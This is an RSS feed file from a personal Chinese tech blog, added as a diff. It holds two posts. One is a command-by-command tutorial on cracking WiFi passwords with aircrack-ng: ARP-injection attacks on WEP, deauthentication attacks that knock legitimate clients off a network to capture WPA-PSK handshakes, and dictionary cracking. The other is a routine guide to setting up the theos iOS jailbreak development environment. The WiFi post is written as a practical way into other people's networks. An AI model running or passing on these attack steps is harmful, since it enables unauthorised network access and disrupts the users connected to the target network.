@@ -1,0 +1,252 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Yasin Blog</title>
+    <description>哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈</description>
+    <link>http://localhost:4000/</link>
+    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
+    <pubDate>Fri, 30 Dec 2016 17:10:48 +0800</pubDate>
+    <lastBuildDate>Fri, 30 Dec 2016 17:10:48 +0800</lastBuildDate>
+    <generator>Jekyll v3.3.1</generator>
+    
+      <item>
+        <title>Mac下的WIFI破解</title>
+        <description>&lt;p&gt;以前破wifi用的是CDLinux下的工具，最近换了mac研究了一下mac下的wifi破解工具，速度还行。不过现在到处都是免费wifi，还有好用的万能钥匙，这些技术用的都比较少了，写下来备用吧。&lt;/p&gt;
+
+&lt;h2 id=&quot;一wep破解&quot;&gt;一、wep破解&lt;/h2&gt;
+
+&lt;h3 id=&quot;1载入无线网卡&quot;&gt;1、载入无线网卡&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ifconfig -a查看网卡
+ifconfig wlan0 up加载网卡
+iwconfig只查看无线网卡
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;2激活无线网卡只monitor监听模式&quot;&gt;2、激活无线网卡只monitor监听模式&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;airmon-ng start 上面查看的网卡名
+
+monitor mode enabled on mon0便是已启动监听模式，监听模式下适配器名称变更为mon0。
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;3探测无线网络抓取无线数据包&quot;&gt;3、探测无线网络，抓取无线数据包&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;airodump-ng mon0 //mon0为之前已经载入并激活监听模式的无线网卡
+
+airodump-ng --ivs –w longas -c 6 wlan0 //抓取数据包
+参数解释：
+--ivs 这里的设置是通过设置过滤，不再将所有无线数据保存，而只是保存可用于破解的IVS数据报文，这样可以有效地缩减保存的数据包大小；
+-c 这里我们设置目标AP的工作频道，通过刚才的观察，我们要进行攻击测试的无线路由器工作频道为6；
+-w 后跟要保存的文件名，这里w就是“write写”的意思，所以输入自己希望保持的文件名，如下图10所示我这里就写为longas。那么，小黑们一定要注意的是：这里我们虽然设置保存的文件名是longas，但是生成的文件却不是longase.ivs，而是longas-01.ivs。
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;4对目标ap使用arprequest注入攻击加速数据包的获取&quot;&gt;4、对目标AP使用ArpRequest注入攻击，加速数据包的获取&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;aireplay-ng -3 -b AP的mac -h 客户端的mac mon0 
+参数解释：
+-3 指采用ARPRequesr注入攻击模式；
+-b 后跟AP的MAC地址，这里就是前面我们探测到的SSID为TPLINK的AP的MAC；
+-h 后跟客户端的MAC地址，也就是我们前面探测到的有效无线客户端的MAC；
+最后跟上无线网卡的名称，这里就是mon0啦。
+在等待片刻之后，一旦成功截获到ARP请求报文，我们将会看到如下图13所示的大量ARP报文快速交互的情况出现。
+此时回到airodump-ng 会看到packets栏的数字在飞速递增。
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;5打开aircrack-ng开始破解wep&quot;&gt;5、打开aircrack-ng，开始破解WEP&lt;/h3&gt;
+
+&lt;p&gt;在抓取的无线数据报文达到了一定数量后，一般都是指IVs值达到2万以上时，就可以开始破解，若不能成功就等待数据报文的继续抓取然后多试几次。注意，此处不需要将进行注入攻击的Shell关闭，而是另外开一个Shell进行同步破解。输入命令如下：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;aircrack-ng 捕获的ivs文件
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;二wap-psk破解&quot;&gt;二、wap-psk破解&lt;/h2&gt;
+
+&lt;h3 id=&quot;1升级aircrack-ng&quot;&gt;1、升级Aircrack-ng&lt;/h3&gt;
+
+&lt;p&gt;最好对airodump-ng的OUI库进行升级，先进入到Aircrack-ng的安装目录下，然后输入命令如下：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;airodump-ng-oui-update
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;2载入并激活无线网卡至monitor即监听模式&quot;&gt;2、载入并激活无线网卡至monitor即监听模式&lt;/h3&gt;
+
+&lt;p&gt;载入无线网卡的顺序及命令部分，依次输入下述命令&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;startx            进入到图形界面
+ifconfig –a       查看无线网卡状态
+ifconfig  wlan0  up     载入无线网卡驱动
+airmon-ng  start  wlan0  激活网卡到monitor模式
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;3探测无线网络抓取无线数据包-1&quot;&gt;3、探测无线网络，抓取无线数据包&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;airodump-ng -c 6 –w longas mon0
+参数解释：
+-c 这里我们设置目标AP的工作频道，通过观察，我们要进行攻击测试的无线路由器工作频道为6；
+-w 后跟要保存的文件名，这里w就是“write写”的意思，所以输入自己希望保持的文件名，这里我就写为longas。那么，小黑们一定要注意的是：这里我们虽然设置保存的文件名是longas，但是生成的文件却不是longas.cap，而是longas-01.cap。
+mon0 为之前已经载入并激活监听模式的无线网卡。
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;4进行deauth攻击加速破解过程&quot;&gt;4、进行Deauth攻击加速破解过程&lt;/h3&gt;
+
+&lt;p&gt;和破解WEP时不同，这里为了获得破解所需的WPA-PSK握手验证的整个完整数据包，无线黑客们将会发送一种称之为“Deauth”的数据包来将已经连接至无线路由器的合法无线客户端强制断开，此时，客户端就会自动重新连接无线路由器，黑客们也就有机会捕获到包含WPA-PSK握手验证的完整数据包了。此处具体输入命令如下：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;aireplay-ng -0 1 –a AP的mac -c 客户端的mac wlan0 
+参数解释：
+-0 采用deauth攻击模式，后面跟上攻击次数，这里我设置为1，大家可以根据实际情况设置为10不等；
+-a 后跟AP的MAC地址；
+-c 后跟客户端的MAC地址；
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;5开始破解wpa-psk&quot;&gt;5、开始破解WPA-PSK&lt;/h3&gt;
+
+&lt;p&gt;在成功获取到无线WPA-PSK验证数据报文后，就可以开始破解，输入命令如下：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;aircrack-ng -w dic 捕获的cap文件 
+-w 后跟预先制作的字典，这里是BT4下默认携带的字典。
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;命令合集&quot;&gt;命令合集&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;aircrack-ng
+主要用于WEP及WPA-PSK密码的恢复，只要airodump-ng收集到足够数量的数据包，aircrack-ng就可以自动检测数据包并判断是否可以破解
+airmon-ng
+用于改变无线网卡工作模式，以便其他工具的顺利使用
+airodump-ng
+用于捕获802.11数据报文，以便于aircrack-ng破解
+aireplay-ng
+在进行WEP及WPA-PSK密码恢复时，可以根据需要创建特殊的无线网络数据报文及流量
+airserv-ng
+可以将无线网卡连接至某一特定端口，为攻击时灵活调用做准备
+airolib-ng
+进行WPA Rainbow Table攻击时使用，用于建立特定数据库文件
+airdecap-ng
+用于解开处于加密状态的数据包
+tools
+其他用于辅助的工具，如airdriver-ng、packetforge-ng等
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;破解wifi密码总结&quot;&gt;破解WIFI密码总结&lt;/h1&gt;
+
+&lt;p&gt;这里我总结一下常用的流程，其实只有3个步骤。&lt;/p&gt;
+
+&lt;h3 id=&quot;获取搜索到的wifi&quot;&gt;获取搜索到的wifi&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;airport -s
+SSID 是 wifi名称，RSSI 是信号强度，CHANNEL 是信道。
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;开始监听&quot;&gt;开始监听&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo airport en0 sniff 1
+en0是网卡   1是要抓包的信道
+抓包.cap文件默认保存在/tmp  -w可以改变保存路径
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;解析&quot;&gt;解析&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;aircrack-ng -w 1.txt 1.cap
+1.txt是字典暴  1.cap是抓包文件
+可以看到cap包的内容，Encryption中（0 handshake）是抓包失败，（1 handshake）则是抓包成功。
+记住成功的行数，Index number of target network ?后面输入行数，回车。
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+</description>
+        <pubDate>Thu, 29 Dec 2016 20:00:00 +0800</pubDate>
+        <link>http://localhost:4000/2016/12/29/wifi%E7%A0%B4%E8%A7%A3/</link>
+        <guid isPermaLink="true">http://localhost:4000/2016/12/29/wifi%E7%A0%B4%E8%A7%A3/</guid>
+        
+        <category>安全</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>theos越狱环境搭建</title>
+        <description>&lt;p&gt;&lt;a href=&quot;https://github.com/theos/theos/wiki/Installation&quot;&gt;参考文档&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;ldid安装&quot;&gt;ldid安装&lt;/h2&gt;
+
+&lt;p&gt;ldid可以在http://joedj.net/ldid 下载
+复制到&lt;code class=&quot;highlighter-rouge&quot;&gt;/opt/theos/bin&lt;/code&gt;里面
+执行&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo chmod 777 /opt/theos/bin/ldid&lt;/code&gt;提升权限&lt;/p&gt;
+
+&lt;h2 id=&quot;libsubstratedylib&quot;&gt;libsubstrate.dylib&lt;/h2&gt;
+
+&lt;p&gt;这个需要用到手机助手的文件管理功能把&lt;code class=&quot;highlighter-rouge&quot;&gt;/Library/Frameworks/CydiaSubstrate.framework/CydiaSubstrate&lt;/code&gt;复制出来
+改名为&lt;code class=&quot;highlighter-rouge&quot;&gt;libsubstrate.dylib&lt;/code&gt;，然后放到&lt;code class=&quot;highlighter-rouge&quot;&gt;/opt/theos/lib&lt;/code&gt; 中。&lt;/p&gt;
+
+&lt;h2 id=&quot;dkpg安装&quot;&gt;dkpg安装&lt;/h2&gt;
+
+&lt;p&gt;这个命令需要安装&lt;a href=&quot;https://www.macports.org/install.php&quot;&gt;MacPorts&lt;/a&gt;，选择对应的系统下下来安装即可。
+&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo port install dpkg&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;theos安装&quot;&gt;theos安装&lt;/h2&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd /opt
+$ git clone --recursive https://github.com/theos/theos.git
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;环境配置&quot;&gt;环境配置&lt;/h2&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;~./bash_profile&lt;/code&gt;中加入下面的代码，没有这文件就创建一个
+&lt;code class=&quot;highlighter-rouge&quot;&gt;export THEOS=/opt/theos&lt;/code&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;export PATH=/opt/theos/bin/:$PATH&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;测试一下&quot;&gt;测试一下&lt;/h2&gt;
+
+&lt;p&gt;cd到准备放工程的目录执行&lt;code class=&quot;highlighter-rouge&quot;&gt;/opt/theos/bin/nic.pl&lt;/code&gt;能输入输出下面的选项，theos就配置好了。&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ /opt/theos/bin/nic.pl
+NIC 2.0 - New Instance Creator
+------------------------------
+  [1.] iphone/activator_event
+  [2.] iphone/application_modern
+  [3.] iphone/cydget
+  [4.] iphone/flipswitch_switch
+  [5.] iphone/framework
+  [6.] iphone/ios7_notification_center_widget
+  [7.] iphone/library
+  [8.] iphone/notification_center_widget
+  [9.] iphone/preference_bundle_modern
+  [10.] iphone/tool
+  [11.] iphone/tweak
+  [12.] iphone/xpc_service
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;theos的升级&quot;&gt;theos的升级&lt;/h2&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;git submodule update –recursive&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;注意&quot;&gt;注意&lt;/h2&gt;
+
+&lt;p&gt;在一些老板的安装方法中有&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo /opt/theos/bin/bootstrap.sh substrate&lt;/code&gt;,现在可以不用管了。&lt;/p&gt;
+</description>
+        <pubDate>Thu, 29 Dec 2016 20:00:00 +0800</pubDate>
+        <link>http://localhost:4000/2016/12/29/theos%E5%AE%89%E8%A3%85/</link>
+        <guid isPermaLink="true">http://localhost:4000/2016/12/29/theos%E5%AE%89%E8%A3%85/</guid>
+        
+        <category>安全</category>
+        
+        
+      </item>
+    
+  </channel>
+</rss>
